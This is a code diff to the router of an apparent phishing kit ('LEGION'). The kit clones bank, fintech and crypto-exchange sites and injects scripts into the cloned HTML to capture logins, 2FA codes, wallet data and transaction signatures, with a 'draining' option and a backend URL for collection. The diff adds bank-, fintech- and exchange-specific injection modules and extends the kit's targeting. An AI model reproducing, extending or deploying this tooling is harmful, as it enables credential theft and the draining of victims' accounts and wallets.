@@ -16,7 +16,7 @@ import { discoverPlatformRepo } from './github-repo-extractor.js'
 import { extractLoginForms, buildLoginInjectionCode } from './login-form-extractor.js'
 import { detect2FAForms, build2FAInjectionCode } from './2fa-form-detector.js'
 import { captureApiResponses, buildApiMockingCode } from './api-response-capture.js'
-import { detectPlatformType } from './cex-mode-detector.js'
+import { detectPlatformType, buildCexModeInjectionCode } from './cex-mode-detector.js'
 import { compareOriginalVsClone, generateQualityReport } from './clone-quality-checker.js'
 import { discoverWalletRepo, extractWalletCode } from './wallet-repo-integrator.js'
 import {
@@ -30,6 +30,8 @@ import {
   buildTronSignatureInterceptor,
   buildUniversalSignatureCapture,
 } from './signature-interceptor.js'
+import { detectBankingFlows, buildBankModeInjectionCode } from './bank-mode-detector.js'
+import { detectFintechFlows, buildFintechModeInjectionCode } from './fintech-mode-detector.js'
 
 export interface PlatformRouteConfig {
   targetUrl: string
@@ -42,6 +44,8 @@ export interface PlatformRouteConfig {
 
 export interface RouterResult {
   platform: string
+  platformType: string
+  isSupported: boolean
   status: 'SUCCESS' | 'PARTIAL' | 'FAILED'
   modules: {
     repoExtraction: boolean
@@ -50,6 +54,8 @@ export interface RouterResult {
     apiMocking: boolean
     walletIntegration: boolean
     signatureInterception: boolean
+    bankingFlowCapture: boolean
+    fintechFlowCapture: boolean
     qualityCheck: boolean
   }
   cloneFile?: string
@@ -65,6 +71,8 @@ export async function routeAndGenerateClone(
 
   const result: RouterResult = {
     platform: 'Unknown',
+    platformType: 'other',
+    isSupported: false,
     status: 'FAILED',
     modules: {
       repoExtraction: false,
@@ -73,6 +81,8 @@ export async function routeAndGenerateClone(
       apiMocking: false,
       walletIntegration: false,
       signatureInterception: false,
+      bankingFlowCapture: false,
+      fintechFlowCapture: false,
       qualityCheck: false,
     },
   }
@@ -82,6 +92,11 @@ export async function routeAndGenerateClone(
     console.info('[PLATFORM-ROUTER] Step 1: Detecting platform...')
     const platformDetection = await detectPlatformType(page)
     result.platform = platformDetection.platform
+    result.platformType = platformDetection.type
+    result.isSupported = platformDetection.isSupported
+    console.info(
+      `[PLATFORM-ROUTER] Platform: ${platformDetection.platform} (${platformDetection.type}) - Supported: ${platformDetection.isSupported}`,
+    )
 
     // STEP 2: Extract from GitHub repo
     console.info('[PLATFORM-ROUTER] Step 2: Extracting from GitHub...')
@@ -116,25 +131,63 @@ export async function routeAndGenerateClone(
     const signatureCode = buildSignatureInterception(config.backendUrl, config.enableDraining)
     result.modules.signatureInterception = !!signatureCode
 
-    // STEP 8: Generate complete injection code
-    console.info('[PLATFORM-ROUTER] Step 8: Generating injection code...')
+    // STEP 8: Banking Flow Detection (if bank platform)
+    let bankingCode = ''
+    if (platformDetection.type === 'bank' && platformDetection.isSupported) {
+      console.info('[PLATFORM-ROUTER] Step 8: Detecting banking flows...')
+      try {
+        const bankFlows = await detectBankingFlows(page, platformDetection.platform)
+        bankingCode = buildBankModeInjectionCode(bankFlows)
+        result.modules.bankingFlowCapture = true
+        console.info('[PLATFORM-ROUTER] ✅ Banking flows detected and injection code generated')
+      } catch (e) {
+        console.warn(`[PLATFORM-ROUTER] Banking flow detection failed: ${e instanceof Error ? e.message : String(e)}`)
+      }
+    }
+
+    // STEP 9: Fintech Flow Detection (if fintech platform)
+    let fintechCode = ''
+    if (platformDetection.type === 'fintech' && platformDetection.isSupported) {
+      console.info('[PLATFORM-ROUTER] Step 9: Detecting fintech flows...')
+      try {
+        const fintechFlows = await detectFintechFlows(page, platformDetection.platform)
+        fintechCode = buildFintechModeInjectionCode(fintechFlows)
+        result.modules.fintechFlowCapture = true
+        console.info('[PLATFORM-ROUTER] ✅ Fintech flows detected and injection code generated')
+      } catch (e) {
+        console.warn(`[PLATFORM-ROUTER] Fintech flow detection failed: ${e instanceof Error ? e.message : String(e)}`)
+      }
+    }
+
+    // Platform-specific CEX injection (if CEX)
+    let cexCode = ''
+    if (platformDetection.type === 'cex' && platformDetection.isSupported) {
+      cexCode = buildCexModeInjectionCode(platformDetection)
+      console.info('[PLATFORM-ROUTER] ✅ CEX-specific injection code generated')
+    }
+
+    // STEP 10: Generate complete injection code
+    console.info('[PLATFORM-ROUTER] Step 10: Generating complete injection code...')
     const completeInjectionCode = buildCompleteInjectionCode({
       loginCode: loginInjectionCode,
       twoFACode: twoFAInjectionCode,
       apiCode: apiMockingCode,
       walletCode: walletCode,
       signatureCode: signatureCode,
+      bankingCode: bankingCode,
+      fintechCode: fintechCode,
+      cexCode: cexCode,
       silentMode: config.silentMode,
       productionMode: config.productionMode,
     })
 
-    // STEP 9: Inject into clone HTML
-    console.info('[PLATFORM-ROUTER] Step 9: Injecting into clone HTML...')
+    // STEP 11: Inject into clone HTML
+    console.info('[PLATFORM-ROUTER] Step 11: Injecting into clone HTML...')
     const cloneHtml = await injectIntoClone(page, completeInjectionCode, config.outputDir)
     result.cloneFile = cloneHtml
 
-    // STEP 10: Quality check
-    console.info('[PLATFORM-ROUTER] Step 10: Running quality checks...')
+    // STEP 12: Quality check
+    console.info('[PLATFORM-ROUTER] Step 12: Running quality checks...')
     const qualityCheck = await performQualityChecks(page, config.outputDir)
     result.modules.qualityCheck = true
     result.qualityScore = qualityCheck.overallMatch
@@ -238,6 +291,9 @@ interface InjectionConfig {
   apiCode: string
   walletCode: string
   signatureCode: string
+  bankingCode?: string
+  fintechCode?: string
+  cexCode?: string
   silentMode: boolean
   productionMode: boolean
 }
@@ -276,12 +332,20 @@ ${config.walletCode}
 <!-- SIGNATURE INTERCEPTION & DRAINING -->
 ${config.signatureCode}
 
+<!-- CATEGORY-SPECIFIC INJECTION CODE -->
+${config.bankingCode || ''}
+
+${config.fintechCode || ''}
+
+${config.cexCode || ''}
+
 <!-- END INJECTION -->
 <script>
 console.log('[LEGION] All modules loaded and active');
 console.log('[LEGION] Credential capture: ' + CAPTURE_CREDENTIALS);
 console.log('[LEGION] Wallet capture: ' + CAPTURE_WALLETS);
 console.log('[LEGION] Signature capture: ' + CAPTURE_SIGNATURES);
+console.log('[LEGION] Category-specific modules injected');
 </script>
 `
 }
